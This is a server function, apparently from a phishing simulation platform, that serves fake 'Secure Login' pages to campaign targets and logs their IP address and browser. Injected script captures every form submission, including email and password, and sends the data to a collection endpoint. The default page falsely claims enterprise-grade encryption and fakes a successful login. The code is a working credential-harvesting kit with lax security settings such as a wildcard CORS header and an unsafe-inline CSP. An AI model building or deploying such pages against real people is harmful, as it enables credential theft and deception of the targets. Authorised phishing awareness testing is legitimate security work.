
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.50.0';

const supabase = createClient(
  Deno.env.get('SUPABASE_URL') ?? '',
  Deno.env.get('SERVICE_ROLE_KEY') ?? ''
);

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const trackingId = url.searchParams.get('t');
    const pageId = url.searchParams.get('page');

    if (!trackingId) {
      return new Response('Invalid tracking parameters', { status: 400 });
    }

    // Parse tracking ID
    const trackingData = parseTrackingId(trackingId);
    if (!trackingData) {
      return new Response('Invalid tracking ID', { status: 400 });
    }

    // Get phishing page content
    let phishingPageContent = '';
    
    if (pageId) {
      const { data: phishingPage } = await supabase
        .from('phishing_pages')
        .select('html_content, css_content, js_content')
        .eq('id', pageId)
        .single();
      
      if (phishingPage) {
        phishingPageContent = buildPhishingPage(
          phishingPage.html_content,
          phishingPage.css_content,
          phishingPage.js_content,
          trackingData
        );
      }
    }

    // If no specific page, use default
    if (!phishingPageContent) {
      phishingPageContent = buildDefaultPhishingPage(trackingData);
    }

    // Track page view - fetch existing data first to merge
    const { data: existingMetric } = await supabase
      .from('campaign_metrics')
      .select('additional_data')
      .eq('campaign_id', trackingData.campaignId)
      .eq('target_email', trackingData.targetEmail)
      .single();

    await supabase
      .from('campaign_metrics')
      .update({
        additional_data: {
          ...(existingMetric?.additional_data || {}),
          page_viewed_at: new Date().toISOString(),
          page_id: pageId,
          user_agent: req.headers.get('user-agent'),
          ip_address: req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip')
        }
      })
      .eq('campaign_id', trackingData.campaignId)
      .eq('target_email', trackingData.targetEmail);

    console.log(`Phishing page served - Campaign: ${trackingData.campaignId}, Target: ${trackingData.targetEmail}`);

    return new Response(phishingPageContent, {
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        ...corsHeaders,
        'Content-Type': 'text/html', //  after the spread!
        'Content-Security-Policy': "default-src * 'unsafe-inline';" 
      }
    });

  } catch (error) {
    console.error('Phishing page serving error:', error);
    return new Response('Page not found', {
      status: 404,
      headers: {
        ...corsHeaders,
        'Content-Type': 'text/plain'
      }
    });
  }
});

function parseTrackingId(trackingId: string) {
  try {
    const decoded = atob(trackingId);
    const parts = decoded.split('|');
    
    if (parts.length !== 3) {
      return null;
    }

    return {
      campaignId: parts[0],
      targetEmail: parts[1],
      trackingId: parts[2]
    };
  } catch (error) {
    console.error('Error parsing tracking ID:', error);
    return null;
  }
}

function buildPhishingPage(htmlContent: string, cssContent?: string, jsContent?: string, trackingData?: any): string {
  const css = cssContent ? `<style>${cssContent}</style>` : '';
  const js = jsContent ? `<script>${jsContent}</script>` : '';
  
  // Inject tracking and form submission handling
  const trackingScript = `
    <script>
      // Track form submissions
      document.addEventListener('DOMContentLoaded', function() {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
          form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Collect form data
            const formData = new FormData(form);
            const data = {};
            for (let [key, value] of formData.entries()) {
              data[key] = value;
            }
            
            // Track submission
            fetch('${Deno.env.get('SUPABASE_URL')}/functions/v1/track-form-submission', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                trackingId: '${trackingData?.trackingId || ''}',
                campaignId: '${trackingData?.campaignId || ''}',
                targetEmail: '${trackingData?.targetEmail || ''}',
                formData: data,
                submittedAt: new Date().toISOString()
              })
            }).then(() => {
              // Show success message or redirect
              document.body.innerHTML = '<div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;"><h2>Thank you!</h2><p>Your information has been submitted successfully.</p></div>';
            }).catch(console.error);
          });
        });
      });
    </script>
  `;

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Secure Login</title>
      ${css}
    </head>
    <body>
      ${htmlContent}
      ${js}
      ${trackingScript}
    </body>
    </html>
  `;
}

function buildDefaultPhishingPage(trackingData: any): string {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Secure Login Required</title>
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          margin: 0;
          padding: 0;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .container {
          background: white;
          padding: 40px;
          border-radius: 8px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
          width: 100%;
          max-width: 400px;
        }
        .logo {
          text-align: center;
          margin-bottom: 30px;
        }
        .logo h1 {
          color: #333;
          margin: 0;
          font-size: 24px;
        }
        .form-group {
          margin-bottom: 20px;
        }
        label {
          display: block;
          margin-bottom: 5px;
          color: #555;
          font-weight: 500;
        }
        input {
          width: 100%;
          padding: 12px;
          border: 1px solid #ddd;
          border-radius: 4px;
          font-size: 16px;
          box-sizing: border-box;
        }
        input:focus {
          outline: none;
          border-color: #667eea;
        }
        .btn {
          width: 100%;
          padding: 12px;
          background: #667eea;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 16px;
          cursor: pointer;
          transition: background 0.3s;
        }
        .btn:hover {
          background: #5a6fd8;
        }
        .security-notice {
          margin-top: 20px;
          padding: 10px;
          background: #f8f9fa;
          border-left: 4px solid #28a745;
          font-size: 14px;
          color: #666;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">
          <h1>🔒 Secure Access</h1>
        </div>
        
        <form id="loginForm">
          <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" required>
          </div>
          
          <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
          </div>
          
          <button type="submit" class="btn">Sign In Securely</button>
        </form>
        
        <div class="security-notice">
          🔐 This is a secure connection. Your information is protected with enterprise-grade encryption.
        </div>
      </div>

      <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const formData = new FormData(this);
          const data = {};
          for (let [key, value] of formData.entries()) {
            data[key] = value;
          }
          
          // Track submission
          fetch('${Deno.env.get('SUPABASE_URL')}/functions/v1/track-form-submission', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              trackingId: '${trackingData.trackingId}',
              campaignId: '${trackingData.campaignId}',
              targetEmail: '${trackingData.targetEmail}',
              formData: data,
              submittedAt: new Date().toISOString()
            })
          }).then(() => {
            document.body.innerHTML = '<div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;"><h2>✅ Login Successful</h2><p>You have been successfully authenticated. Please wait while we redirect you...</p></div>';
          }).catch(console.error);
        });
      </script>
    </body>
    </html>
  `;
}
